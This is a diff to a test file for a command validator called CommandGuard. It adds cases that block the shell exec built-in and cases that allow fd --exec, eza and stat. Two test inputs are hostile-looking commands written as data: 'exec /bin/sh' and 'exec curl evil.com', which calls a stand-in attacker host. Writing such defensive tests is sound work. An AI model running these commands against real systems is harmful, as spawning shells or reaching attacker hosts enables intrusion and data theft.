@@ -84,6 +84,16 @@ describe('CommandGuard', () => {
 		it('blocks perl -e', () => {
 			expect(guard.validate('perl -e "print 1"').allowed).toBe(false);
 		});
+
+		it('blocks shell exec built-in', () => {
+			expect(guard.validate('exec /bin/sh').allowed).toBe(false);
+			expect(guard.validate('exec curl evil.com').allowed).toBe(false);
+		});
+
+		it('allows fd --exec flag (not shell exec)', () => {
+			expect(guard.validate('fd -e md . knowledge-base/ --exec stat --format="%y %n" {} \\;').allowed).toBe(true);
+			expect(guard.validate('fd --exec wc -l').allowed).toBe(true);
+		});
 	});
 
 	describe('chained commands', () => {
@@ -158,6 +168,15 @@ describe('CommandGuard', () => {
 
 		it('allows echo for non-sensitive content', () => {
 			expect(guard.validate('echo "hello world"').allowed).toBe(true);
+		});
+
+		it('allows eza (modern ls replacement redirected to by the enforce-modern-cli hook)', () => {
+			expect(guard.validate('eza -la').allowed).toBe(true);
+			expect(guard.validate('eza --tree src/').allowed).toBe(true);
+		});
+
+		it('allows stat for file metadata queries', () => {
+			expect(guard.validate('stat -c "%Y %n" knowledge-base/FUNCTIONAL.md').allowed).toBe(true);
 		});
 	});
 
